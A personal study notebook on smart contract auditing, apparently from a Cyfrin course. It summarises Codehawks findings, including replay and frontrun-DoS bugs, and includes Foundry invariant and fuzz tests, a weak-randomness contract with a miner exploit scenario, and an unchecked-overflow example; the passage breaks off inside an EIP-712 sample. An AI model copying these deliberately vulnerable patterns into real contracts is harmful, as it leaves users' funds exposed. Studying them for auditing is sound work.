<p>Keep in mind that ensuring security isn‚Äôt only a crucial point in the smart contract development lifecycle, it's a continuous, never-ending process!</p><p></p><ul><li><p>Plan &amp; Design</p></li><li><p>Develop &amp; Test</p></li><li><p>Smart Contract Audit &amp; Post Deploy Planning</p></li><li><p>Deploy</p></li><li><p>Monitor &amp; Maintain</p></li></ul><p></p><blockquote><p>"Security shouldn't just be an afterthought or some box you check. You need to have a security mindset from day one".</p></blockquote><p></p><p>Thinking about post-deployment planning, monitoring and maintaining is just as important as the development itself.</p>

<h2>Before starting the audit</h2>
<ul><li><p>dont accept just etherscan link, you need the code base on github with tests, deployment scripts a ofcourse contracts</p></li></ul><ul><li><p>ask for good README</p></li><li><p>ask what to focus on in our review</p></li><li><p>For your convenience, we've compiled a reference of <a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/minimal-onboarding-questions.md">Minimal Onboarding Questions</a>. This document will help you extract the minimum information necessary for a successful audit or security review.</p></li><li><p>We've also included a more Extensive Onboarding Questions document which is more derivative of what we at Cyfrin use for private audits</p></li></ul><p></p><p>Let's go through these questions and understand why each one is important in preparing for our security review.</p><p></p><ol><li><p>About the Project: Knowledge about the project and its business logic is crucial. You need to be aware of what the project is intended to do so as to spot areas where code implementation does not align with the project's purpose. Remember 80% of vulnerabilities are a product of business logic implementation!</p></li><li><p>Stats: Information about the size of the codebase, how many lines of code are in scope, and its complexity are incredibly vital. This data will help to estimate the timeline and workload for the audit.</p></li><li><p>Setup: We need to ask the protocol how to build and test the project, which frameworks they've used etc.</p></li><li><p>Review Scope: Know the exact commit hash that the client plans to deploy and the specific elements of the codebase it covers. You do not want to spend time auditing code that the client has already modified or doesn't plan to use. The protocol should include the appropriate GitHub URL and explicitly detail which contracts are in scope.</p></li><li><p>Compatibilities: Information about the solidity version the client is using, the chains they plan on working with, and the tokens they will be integrating is important, we'll go into why later.</p></li><li><p>Roles: This entails understanding the different roles and powers within the system and detailing what the different actors should and shouldn't be able to do.</p></li><li><p>Known Issues: Understanding existing vulnerabilities and bugs which are already being considered/fixed. This will allow you to focus on the hidden issues.</p></li></ol><p></p><p>Asking the questions of your client is an integral part of assuring they're ready for an audit. Should a protocol give push back, this is a red flag that they aren't taking security as seriously as they should.</p><p></p><p>As security researchers you're, in a way, educators. It's your job to educate protocols on the importance of these security considerations and adequate documentation.</p><p></p><p>Use cloc tool to get number of source lines of code of the project to understand the scope and respect timelines and workload.</p>

<h2>The Tincho</h2>
<p>Download th ecode and read the documentation - familiarize yourself with the content and context of the codebase</p><p></p><p>By leveraging <code>CLOC</code> and <code>Solidity Metrics</code>, a security researcher can organize the codebase by complexity and systemically go through the contracts - marking them each complete as appropriate. This pragmatic approach ensures no stone is left unturned.</p><p></p><p>It's recommended to start with the smaller and more manageable contracts and build upon them as you go.</p><p><br>There's a point in an audit where your frame of mind should switch to an adversarial one. You should be thinking "How can I break this..."</p><p></p><p>Audit, Review, Audit, Repeat</p><p></p><p>Keeping a record of your work is crucial in this process.</p><p></p><p>Tincho recommends taking notes directly in the code and maintaining a separate file for raw notes/ideas.</p><p></p><p>Remember, there is always a risk of diving too deep into just one part of the code and losing the big picture. So, remember to pop back up and keep an eye on the over-all review of the code base.</p><p></p><p>"I would advise to keep the clients at hand. Ask questions, but also be detached enough." - Tincho</p><p></p><p>Wrapping it Up</p><p>Sometimes it can feel like there's no end to the approaches you can make to a codebase, no end to the lines of code you can check and verify.</p><p></p><p>Tincho advocates for time-bounding yourself. Set limits and be as thorough as possible within them.</p><p></p><p>The Audit Report and Follow Up</p><p>The last stage of this whole process is to present an audit report to the client. It should be clear and concise in the detailing of discovered vulnerabilities and provide recommendations on mitigation.</p><p></p><p>It's our responsibility as security researchers to review the implementation of any mitigations the client employs and to assure that new bugs aren't introduced.</p>

<h2>Reporting</h2>
<p>Level of importance - Title</p><p>Description</p><p>Impact</p><p>Proof of Concept(POC)</p><p>Recommended Mitigation</p><p>Tools Used</p><p></p><p></p><p><strong>Title:</strong></p><p>The first thing we need to fill out is our report's title. We want to be concise while still communicating important details of the vulnerability. A good rule of thumb is that your title should include:</p><p></p><p>Root Cause + Impact</p><p></p><p>So, we ask ourselves what is the root cause of this finding, and what impact does it have?</p><p></p><p>For this finding the root cause would be something aking to:</p><p></p><p>Storage variables on-chain are publicly visible</p><p></p><p>and the impact would be:</p><p></p><p>anyone can view the stored password</p><p></p><p><strong>Description</strong></p><p>Our goal here is to describe the vulnerability consicely while clearly illustrating the problem. A description for our finding here might look like this.</p>

<h2>One Project - Great Audit submissions on Codehawks</h2>
<p>I like this one because even tho its been invalidated, the auditor makes a great point of not giving all the ADMIN rights to just one wallet and adding a multi-sig atleast.</p><p>Another great thing he says is to add time emergency stop to trusted roles in case of the system being compromised. This would make it so the contracts main functionality becomes paused, locking out the attacker of potentially stealing milions of dollars and wreaking havoc.</p><p>One more thing he mentions is the use of time locks, so when role changes or some other big change happens on the contract it will require a waiting period. This would reduce the chance of an attacker immediately exploiting compromised roles.</p><p>As a bonus great thing is also to add events and logging. This would allow the system to track all changes and provide an audit trail in case of malicious activity.<br><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/2">https://codehawks.cyfrin.io/c/2024-11-one-world/s/2</a><br></p><p>love this one, being able to replay the transaction without the users knowledge is very dangerous. the auditor did a great job defending his case.<br><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/836">https://codehawks.cyfrin.io/c/2024-11-one-world/s/836</a></p><p></p><p>the same as previous one, having a verified transaction outside the chain to be able to be replayed after it failed is huge and could cause trouble. The nonce really needs to be updated even if the transaction failed/reverted. A way to achieve this is to increase the nonce before the failing call and handle the failed call gracefully, meaning dont use revert, just emit an event of the failure/success of the call.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/674">https://codehawks.cyfrin.io/c/2024-11-one-world/s/674</a></p><p></p><p>this is a good one too, proxy problem, where contract creates proxyAdminA, but then calling a function on this contract creates a proxy and inside this proxy's constructor it creates another proxyAdminB. Consequently, PA1 (deployed contract) is the owner of PA2. And PA2 acts as the proxyAdmin of the proxy. PA1 can not call functions on PA2 to perform upgrades or change admin. As a result, the proxy cannot be upgraded. To fix it just don't deploy a proxyAdmin and just set msg.sender as owner of proxyAdmin.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/611">https://codehawks.cyfrin.io/c/2024-11-one-world/s/611</a></p><p></p><p>interesting one, the auditor found on discord some message of the contracts sponsors mentioning a cap on members of a DAO being 19825 members / 7 tiers. There is a check for maxMembers, but that parameter is arbitrary set by the caller of the function and not enforced by the contract.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/600">https://codehawks.cyfrin.io/c/2024-11-one-world/s/600</a></p><p></p><p>Auditor talked with sponsors of the contract about the KYC verification and only allowing verified users to interact with certain contracts and call relevant functions such as <code>createNewDAOMembership</code>, <code>joinDAO</code>, <code>upgradeTier</code>, <code>claimProfit</code>, etc. The judge didn't believe it, so the auditor had to pull up discord messages with the sponsors.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/593">https://codehawks.cyfrin.io/c/2024-11-one-world/s/593</a></p><p></p><p>No expiry on off-chain verified transactions would lead to problems. Adding an expiry to <code>executeMetaTransaction</code> will help.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-11-one-world/s/543">https://codehawks.cyfrin.io/c/2024-11-one-world/s/543</a></p><p></p>

<h2>How much money can you make on Code Hawks?</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://profiles.cyfrin.io/u/lanrebayode77">https://profiles.cyfrin.io/u/lanrebayode77</a><br>This guy made $14k by reporting one medium finding on chainlink <a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-07-CL-CCIP"><strong>CCIP v1.5</strong></a> making him the #21 all time on the leaderboards, crazy.</p>

<h2>Liquid Staking - Great Audit submissions on Codehawks</h2>
<p>Here the withdraw function doesn't actually send any money to the user, it just adjusts the pool state of the contract.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-09-stakelink/s/1092">https://codehawks.cyfrin.io/c/2024-09-stakelink/s/1092</a></p><p></p><p>Is very similar to the previous one, withdraw function again doesn't really send the funds to the user.</p><p>This one also has a nice PoC :)</p><p>Fix: Perform the actual token transfer after the internal account balance updates.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-09-stakelink/s/904">https://codehawks.cyfrin.io/c/2024-09-stakelink/s/904</a></p><p></p><p>In this case in the <code>removeSplitter</code> withdraw value is bad, it does not account for the balance reduction after rewards are split up and sent to receivers. It attempts to withdraw the previously cached balance, which may no longer be accurate, thereby leading to a failed token transfer.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-09-stakelink/s/1082">https://codehawks.cyfrin.io/c/2024-09-stakelink/s/1082</a></p><p></p><p>Adding a vault we add it to the vaultMapping, but when removing it we don't deleted from the vaultMapping array making it possible for the vault to still set <code>_receiver</code><em> and </em><code>_amount</code> and withdrawing the rewards even though it should not be able to.</p><p>Easy fix is adding this line to <code>removeVault</code> function <code>vaultMapping[vault] = false;</code> .</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-09-stakelink/s/1057">https://codehawks.cyfrin.io/c/2024-09-stakelink/s/1057</a></p><p></p><p>Very cool frontrun DoS where <code>donateTokens</code> function is used to donate to the pool and that only updates totalStaked but not totalShares. And then when a real first <code>deposit</code> occurs it reverts because in _mintShares will revert because <code>amount -= DEADSHARES;</code> will underflow effectively blocking the first and consecutive legitimate deposits.</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://codehawks.cyfrin.io/c/2024-09-stakelink/s/778">https://codehawks.cyfrin.io/c/2024-09-stakelink/s/778</a></p>

<h2>Weird ERC20 Tokens</h2>
<p>YeildERC20 contained a mechanism which sent a fee to the owner every 10 transactions. This type of behaviour in fee on transfer tokens can actually break many protocols - so it's very important to keep an eye out for these incompatibilities.</p><p></p><p>Other examples of Weird ERC20s may:</p><p></p><p>Allow Re-entrancy - some tokens allow reentrant calls</p><p></p><p>Missing Return Values - some tokens do not return a bool on ERC20 methods - making transaction confirmations difficult</p><p></p><p>Upgradeable ERC20s - these could be changed in the future to behave unexpectedly. USDC is a high profile example of this.</p><p></p><p>Rebasing Tokens - situations where token balances are changes outside of usual transfer calls</p><p></p><p>Block Lists - some tokens do not allow certain addresses to transact</p><p></p><p>The list goes on...</p><p></p><p>There are so many potential exploits that come from unexpected behaviour of Weird ERC20s. The best way to protect against these problems is to know that tokens you expect to interact with. At the end of the day ERC20s are external contracts and we need to defend against them.</p><p></p><p>Again I'll encourage you to familiarize yourself with some of the cases outlined in the GitHub Repo linked here. Additionally, I want to mention there's a great Token Integration Checklist by Trail of Bits that can serve has a great guideline for builders looking to avoid these types of exploits. In fact, secure-contracts.com as a whole is a really invaluable resource you should check out.</p><p></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://thequestioners.joesexperiences.com/qaas/765">What are Weird ERC20 tokens?</a></p>

<h2>PoC for TSwap in Cyfrin Updraft</h2>
<p>Invariant POC</p><pre><code>   function testInvariantBroken() public {
    vm.startPrank(liquidityProvider);
    weth.approve(address(pool), 100e18);
    poolToken.approve(address(pool), 100e18);
    pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
    vm.stopPrank();


    uint256 outputWeth = 1e17;

    vm.startPrank(user);
    poolToken.approve(address(pool), type(uint256).max);
    poolToken.mint(user, 100e18);
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));

    int256 startingY = int256(weth.balanceOf(address(pool)));
    int256 expectedDeltaY = int256(-1) * int256(outputWeth);

    pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp));
    vm.stopPrank();

    uint256 endingY = weth.balanceOf(address(pool));

    int256 actualDeltaY = int256(endingY) - int256(startingY);
    assertEq(actualDeltaY, expectedDeltaY);
}</code></pre>

<h2>Cyfrin Updraft Security Section 5 Challenge: Write a fuzz test to find a bug in this challenge</h2>
<pre><code>    function test_registerFuzz(uint256 amount) public {
    amount = bound(amount, 1e18 + 1, type(uint256).max);
    uint256 amountToPay = registry.PRICE();
    emit Value("amount", amount);
    if(amount &lt; amountToPay) {
      return;
    }
    vm.deal(alice, amount);
    vm.startPrank(alice);

    uint256 aliceBalanceBefore = address(alice).balance;

    registry.register{value: amount}();

    uint256 aliceBalanceAfter = address(alice).balance;
    
    assertTrue(registry.isRegistered(alice), "Did not register user");
    assertEq(address(registry).balance, registry.PRICE(), "Unexpected registry balance");
    assertEq(aliceBalanceAfter, aliceBalanceBefore - registry.PRICE(), "Unexpected user balance");
}</code></pre><p></p><p>That's my solution, tincho used assume like this to get the right amount, because minimum is 1e18.</p><pre><code>function test_fuzz_register(uint256 amountToPay) public {
vm.assume(amountToPay &gt;= 1 ether);
...
}</code></pre>

<h2>How to set a minimum value for fuzz test arguments in Foundry?</h2>
<p>Usef <code>bound()</code> of <code>vm.assume()</code>.</p><p><strong>When to use </strong><code>vm.assume</code>:</p><ul><li><p>When you want to exclude large ranges of input (like <code>x &gt; 1e18</code>).</p></li><li><p>When the constraint logic is simple.</p></li></ul><p><strong>When to use </strong><code>bound</code>:</p><ul><li><p>When you want to restrict inputs to a small range.</p></li><li><p>When the range is very specific (e.g., <code>1e18 &lt; x &lt; 1e20</code>).<br></p></li></ul>

<h2>How to test only one test</h2>
<p><code>forge test --mt test_name -vvvv</code><br>So I suppose argument --mt means match test</p><p>and ofc make it super verbose with -vvvv</p>

<h2>How to Evaluate a Finding's Severity</h2>
<p>Determining the category comes down to two elements: the likelihood of an attack and the impact of the attack. <br></p><h3>Impact: High, Medium, and Low</h3><p>1. <strong>High Impact</strong>: funds are directly or nearly directly at risk, or a severe disruption of protocol functionality or availability occurs.</p><p>2. <strong>Medium Impact</strong>: funds are indirectly at risk or there‚Äôs some level of disruption to the protocol‚Äôs functionality.</p><p>3. <strong>Low Impact</strong>: Fund are not at risk, but a function might be incorrect, or a state handled improperly etc.</p><p><br>Think of it in terms of user experience - <em>how pissed off would users be if an attack happened?</em></p><h3></h3><h3>Likelihood: High, Medium, and Low</h3><ol><li><p><strong>High Likelihood</strong>: Highly probably to happen.</p><ul><li><p>a hacker can call a function directly and extract money</p></li></ul></li><li><p><strong>Medium Likelihood</strong>: Might occur under specific conditions.</p><ul><li><p>a peculiar ERC20 token is used on the platform.</p></li></ul></li><li><p><strong>Low Likelihood</strong>: Unlikely to occur.</p><ul><li><p>a hard-to-change variable is set to a unique value at a specific time.</p></li></ul></li></ol>

<h2>Making a PDF of your Audit from markdown</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://updraft.cyfrin.io/courses/security/first-audit/making-a-pdf">link</a></p>

<h2>Static Analysis Tools for Auditing</h2>
<ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/crytic/slither"><strong>Slither</strong></a> - A pythonic static analysis tool compatible with Solidity and Vyper</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/Cyfrin/aderyn"><strong>Aderyn</strong></a> - Built in Rust by <em>Alex Roan</em>, Aderyn traverses Abstract Syntax Trees to highlight suspected vulnerabilities.</p></li></ul>

<h2>Problem with generating random numbers in solidity</h2>
<h2>Weak PRNG</h2><p>In short - the blockchain is deterministic. Using on-chain variables and pseudo random number generation leaves a protocol open to exploits whereby an attacker can predict or manipulate the 'random' value.</p><p></p><p>Miners can influence global variables favorable - there's a lot more <em>weirdness</em> that goes into random numbers on-chain.<br><br>If you've seen any of my other content, you know that Chainlink VRF is a solution for this problem, and I encourage you to check out the <a target="_blank" rel="noopener noreferrer nofollow" href="https://docs.chain.link/vrf"><strong>documentation</strong></a> for some additional learnings.<br></p><h3>Configuration</h3><ul><li><p>Check: <code>weak-prng</code></p></li><li><p>Severity: <code>High</code></p></li><li><p>Confidence: <code>Medium</code></p></li></ul><h3>Description</h3><p>Weak PRNG due to a modulo on <code>block.timestamp</code>, <code>now</code> or <code>blockhash</code>. These can be influenced by miners to some extent so they should be avoided.</p><h3>Exploit Scenario:</h3><pre><code>contract Game {

    uint reward_determining_number;

    function guessing() external{
      reward_determining_number = uint256(block.blockhash(10000)) % 10;
    }
}</code></pre><p>Eve is a miner. Eve calls <code>guessing</code> and re-orders the block containing the transaction. As a result, Eve wins the game.</p><h3>Recommendation</h3><p>Do not use <code>block.timestamp</code>, <code>now</code> or <code>blockhash</code> as a source of randomness</p><p></p><h3>Mitigating Weak Randomness</h3><p>In short, relying on on-chain data to generate random numbers is problematic due to the deterministic nature of the blockchain. The easiest way to mitigate this is to generate random numbers off-chain.</p><p>Some off-chain solutions include:</p><p><strong>Chainlink VRF:</strong> "A provably fair and verifiable random number generator (RNG) that enables smart contracts to access random values without compromising security or usability. For each request, Chainlink VRF generates one or more random values and cryptographic proof of how those values were determined. The proof is published and verified on-chain before any consuming applications can use it. This process ensures that results cannot be tampered with or manipulated by any single entity including oracle operators, miners, users, or smart contract developers." - I encourage you to <a target="_blank" rel="noopener noreferrer nofollow" href="https://docs.chain.link/vrf"><strong>check out the Docs</strong></a>.</p><p><strong>Commit Reveal Scheme:</strong> "The scheme involves two steps: commit and reveal.</p><p>During the commit phase, users submit a commitment that contains the hash of their answer along with a random seed value. The smart contract stores this commitment on the blockchain. Later, during the reveal phase, the user reveals their answer and the seed value. The smart contract then checks that the revealed answer and the hash match, and that the seed value is the same as the one submitted earlier. If everything checks out, the contract accepts the answer as valid and rewards the user accordingly." - Read more in this <a target="_blank" rel="noopener noreferrer nofollow" href="https://medium.com/coinmonks/commit-reveal-scheme-in-solidity-c06eba4091bb"><strong>Medium Article</strong></a>!</p>

<h2>Integer overflow/underflow</h2>
<blockquote><p><strong>Note:</strong> This true for ints and uints in all versions of Solidity <strong>prior to</strong> 0.8.0.</p><p>In Solidity versions 0.8.0+ <code>unchecked</code> is required to expose this vulnerability. Uints and ints are <code>checked</code> by default. If a max is surpassed in these versions, the transaction will revert.</p></blockquote><p>The situation is the same in circumstances of <code>underflow</code>. An integer will wrap to the max value if reduced past it's limit. You can practice this with our remix example as well.</p><pre><code class="language-solidity">contract Overflow {
    uint8 public count;

    // uint8 has a max value of 255, so if we add 1 to 255, we get 0 if it's unchecked!
    // Versions prior to 0.8 of solidity also have this issue
    function increment(uint8 amount) public {
        unchecked {
            count = count + amount;
        }
    }
}

function test_overflow() public {
    uint8 amount = type(uint8).max;
    overflow.increment(amount);
    overflow.increment(1);

    // Wait... it's zero??
    assertEq(overflow.count(), 0);
}</code></pre><p></p>

<h2>How to spot a possible Re-entrancy</h2>
<p>Finally we see calls to send the <code>prizePool</code> and mint the NFT to the winner.</p><pre><code>(bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);</code></pre><p>We may even suspect that <code>re-entrancy</code> is a risk here, given the order of these lines. So let's verify!</p><p>When a call is made externally, we should always ask ourselves what could happen in different scenarios.</p><ul><li><p><em>What if the recipient is a smart contract?</em></p></li><li><p><em>What if the contract doesn't have a receive/fallback function or forces a revert?</em></p></li><li><p><em>What if the recipient calls another function through receive/fallback?</em></p></li></ul><p>The more experience you gain performing security reviews, the better your intuition will be about which questions to ask and what to watch out for.</p>

<h2>Decentralization Comparison: Bitcoin vs. DeFi Protocols </h2>
<p><strong>Feature;Bitcoin;"Decentralized" DeFi Protocol</strong></p><p><strong>Admin Control: </strong>üö´ None (zero control); üü° Multisig or Owner (control exists)</p><p><strong>Upgrade Process: </strong>Community consensus; Dev team or multisig (instant control)</p><p><strong>Supply Cap: </strong>21M hardcoded; Token minting is possible (inflation)</p><p><strong>Can Funds Be Taken?: </strong>Impossible (No keys); Possible (with admin keys)</p><p><strong>Security Model: </strong>Proof-of-Work (PoW); Often Proof-of-Stake (PoS) or other</p><p><strong>Governance: </strong>No governance; Admin-controlled, DAO, or multisig</p><p><strong>Change Timeline: Years</strong> (slow); <strong>Minutes</strong> (owner-controlled proxy)</p><p></p><h3><strong>Summary</strong></h3><p>Bitcoin is <strong>truly decentralized</strong> because:</p><ul><li><p><strong>No one controls it</strong> (not developers, miners, or a "foundation").</p></li><li><p>Changes require <strong>community-wide consensus</strong> (not a single owner "upgrading a proxy").</p></li><li><p>The 21M BTC supply is <strong>untouchable</strong> (nobody can increase it).</p></li><li><p>It‚Äôs <strong>slow to change</strong>, and that‚Äôs a feature, not a bug.</p></li></ul><p>Most "decentralized" DeFi projects are like <strong>centralized companies disguised as DAOs</strong>. They claim "decentralization" but have <strong>admin keys, owner roles, and upgradable proxies</strong> that let them change the logic at any time.</p><p><strong>Bitcoin doesn‚Äôt have an admin key. Bitcoin has no CEO. Bitcoin has no proxy to upgrade.</strong></p><p>This is why Bitcoin has been running since <strong>2009 with 100% uptime</strong>, while other protocols (like Solana, Terra, etc.) have <strong>crashed or been exploited</strong>.</p><p></p><p>If you want true decentralization, you have to give up control ‚Äî and that's hard for VCs, developers, and token creators to do. They prefer to <strong>pretend to be decentralized</strong>, while secretly holding the "admin key." Bitcoin doesn‚Äôt play that game. <strong>Bitcoin is the only asset with zero admin keys.</strong></p><p></p><p>If you want real decentralization, look for systems where:</p><ul><li><p>No admin can change the rules.</p></li><li><p>No single entity can change your funds.</p></li><li><p>No developer team can change the contract logic.</p></li></ul><p>If they can, it‚Äôs not decentralized ‚Äî it‚Äôs a <strong>"controlled protocol with decentralization theater."</strong></p><p>Bitcoin remains one of the only true decentralized systems, and that‚Äôs why it‚Äôs still called <strong>"digital gold."</strong> üü†</p><p></p>

<h2>Is Ethereum Decentralized?</h2>
<p>It‚Äôs a <strong>yes and no</strong> situation. Ethereum is more decentralized than traditional finance, but <strong>less decentralized than Bitcoin</strong>. Here‚Äôs why:</p><p></p><p><strong>Factor;Bitcoin;Ethereum</strong></p><p><strong>Admin Control?: </strong>üö´ None (zero); üü° Multisig or Core Devs</p><p><strong>Upgradeable Contracts?: </strong>üö´ No; ‚úÖ Yes (Proxies)</p><p><strong>Supply Limit?: </strong>‚úÖ 21M Fixed; ‚ùå No fixed limit</p><p><strong>Consensus Control?: </strong>‚õèÔ∏è Miners &amp; Nodes; üü° Validators &amp; Devs</p><p><strong>Changes Possible?: </strong>‚ùå Almost Impossible; ‚úÖ Frequent (EIPs)</p><p><strong>Governance Speed?: </strong>üê¢ Slow &amp; Careful; ‚ö°Ô∏è Fast &amp; Active</p><p></p><h4><strong>Validators Control the Network (Not Miners)</strong></h4><ul><li><p>After the switch to <strong>Proof of Stake (PoS)</strong>, Ethereum's network is controlled by <strong>validators</strong> instead of miners.</p></li><li><p>Validators <strong>stake ETH</strong> to participate in block production and earn rewards.</p></li><li><p>Unlike Bitcoin miners, Ethereum validators can be seen as <strong>more centralized</strong> since many people use big services like Lido, Coinbase, and Kraken to stake ETH.</p></li><li><p>About <strong>60-70% of all staking is controlled by a few large players</strong> (Lido, Coinbase, Binance).</p></li><li><p>If these validators colluded, they could <strong>censor transactions or change consensus rules</strong></p><p></p></li></ul><p><strong>Summary</strong></p><p>Ethereum is a "world computer" that‚Äôs more centralized than Bitcoin. It‚Äôs controlled by core developers, validators (Lido, Coinbase, Binance), and the Ethereum Foundation. Smart contracts on Ethereum are often <strong>upgradable</strong> through multisigs, unlike Bitcoin‚Äôs <strong>final, unchangeable transactions</strong>.</p><p>Ethereum is still much more decentralized than banks, but it's not Bitcoin-level decentralization. If you want "rules that can't be changed", Bitcoin is the better choice. If you want "programmable logic", Ethereum wins.</p><p></p>

<h2>What is meant by "If a block is more than 50% full, the `Base Gas Fee` is increased for the next block."</h2>
<p>Blocks have a max capacity of 30M units of gas. That's all the computation that can be executed per block.</p><p>The <code>baseFee</code> for the next block is determine in the following way:</p><p>- If in the previous block more than the 50% is used, then <code>baseFee</code> increases 12.5%</p><p>- If in the previous block less than the 50% is used, then <code>baseFee</code> drecreases 12.5%</p><p>This algorithm is in place to regulate the demand for block.<br><br>Original text: The fee is dynamic, under EIP-1559, if a block is more than 50% full, the Base Gas Fee is increased for the next block. Likewise, if a block is less then 50% full, the fee decreases. This serves to balance network demand and capacity.<br></p>

<h2>Write conclusive tests</h2>
<p>let say you have a sawp</p><p>which allows you to swap token a for token b, easy thing to test is: does it swap something?</p><p>but beside that, there are other things which are important: what if someone swaps in 0? is the price predicatble? is the deadline and slippage conclusive?</p><p>a function doing what it is supposed to be doing is relatively simple, but the function doing what it is supposed to be doing THE CORRECT and FAIR way, thats hard</p><p>and i think that is the difficulty for us auditors, to not think in trivial operations</p><p></p><p>I understand what you're saying, but for a beginner like me. If I see more than 90%, I'm thinkin "wow, I have done my job, almost all the functions are tested, lets proceed with the code". How to avoid doing this.</p><p></p><p>yeah, but that's not it</p><p>you will need to get more thirsty</p>

<h2>The Hans Checklist</h2>
<p>This checklist serves as an itemized reference of things that should be checked when performing an audit. It breaks down a huge number of vulnerabilities and attack vectors as well as provides descriptions, references and remediations.</p><p></p><p>Each section of the checklist poses questions a security researcher should ask themselves to determine the risk and applicability to a code base they're reviewing.</p><p></p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://solodit.cyfrin.io/checklist">link</a></p>

<h2>Signatures Summarized</h2>
<h3>Signing</h3><ol><li><p>Take a private key + message</p><ul><li><p>The message is generally comprised of: data, function selectors, parameters etc</p></li></ul></li><li><p>Pass both the private key + message into the <a target="_blank" rel="noopener noreferrer nofollow" href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm"><strong>Elliptic Curve Digital Signature Algorithm</strong></a> (ECDSA)</p><ul><li><p>We don't dive deep into ECDSA, but I recommend you do</p></li><li><p>outputs <code>v, r, and s</code></p></li></ul></li><li><p><code>v, r, and s</code> are used to verify someone's signature using the precompile <code>ecrecover</code>.</p></li></ol><p></p><h3>Verifying</h3><ol><li><p>Take signed message</p><ul><li><p>Break into <code>v, r, and s</code> using <code>ECDSA</code></p></li></ul></li><li><p>Take message <code>data</code></p></li><li><p>Pass message <code>data</code> and <code>v, r, and s</code> to <code>ecrecover</code>.</p><ul><li><p><code>ecrecover</code> outputs the address which signed the message</p></li><li><p>Compare this vs your expected address to verify</p></li></ul></li></ol>

<h2>What's the EIP-712 standard?</h2>
<p>EIP-712 introduced a standardized way to handle hashing and signing typed and structured data.</p><p></p><p>In a practical sense this has transactions formatting data in such a way that rather than messages being a bytesstring, they could be parsed into meaningful, human readable information.</p>

<h2>Whats evmdiff?</h2>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.evmdiff.com/"><strong>evmdiff</strong></a> Allows you to directly compare two chains and clearly identify their differences. For example, Arbitrum One has a number of additional precompiles that aren't present on Ethereum:<br><br><br></p>

<h2>EIP hashing example</h2>

<pre><code>pragma solidity ^0.4.24;

    contract Example {
        struct EIP712Domain {
            string name;
            string version;
            uint256 chainId;
            address verifyingContract;
        }
    
        struct Person {
            string name;
            address wallet;
        }
    
        struct Mail {
            Person from;
            Person to;
            string contents;
        }
    
        bytes32 constant EIP712DOMAIN_TYPEHASH =
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    
        bytes32 constant PERSON_TYPEHASH = keccak256("Person(string name,address wallet)");
    
        bytes32 constant MAIL_TYPEHASH =
            keccak256("Mail(Person from,Person to,string contents)Person(string name,address wallet)");
    
        bytes32 DOMAIN_SEPARATOR;
    
        constructor() public {
            DOMAIN_SEPARATOR = hash(
                EIP712Domain({
                    name: "Ether Mail",
                    version: "1",
                    chainId: 1,
                    // verifyingContract: this
                    verifyingContract: 0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC
                })
            );
        }
    
        function hash(EIP712Domain eip712Domain) internal pure returns (bytes32) {
            return keccak256(
                abi.encode(
                    EIP712DOMAIN_TYPEHASH,
                    keccak256(bytes(eip712Domain.name)),
                    keccak256(bytes(eip712Domain.version)),
                    eip712Domain.chainId,
                    eip712Domain.verifyingContract
                )
            );
        }
    
        function hash(Person person) internal pure returns (bytes32) {
            return keccak256(abi.encode(PERSON_TYPEHASH, keccak256(bytes(person.name)), person.wallet));
        }
    
        function hash(Mail mail) internal pure returns (bytes32) {
            return keccak256(abi.encode(MAIL_TYPEHASH, hash(mail.from), hash(mail.to), keccak256(bytes(mail.contents))));
        }
    
        function verify(Mail mail, uint8 v, bytes32 r, bytes32 s) internal view returns (bool) {
            // Note: we need to use `encodePacked` here instead of `encode`.
            bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, hash(mail)));
            return ecrecover(digest, v, r, s) == mail.from.wallet;
        }
    
        function test() public view returns (bool) {
            // Example signed message
            Mail memory mail = Mail({
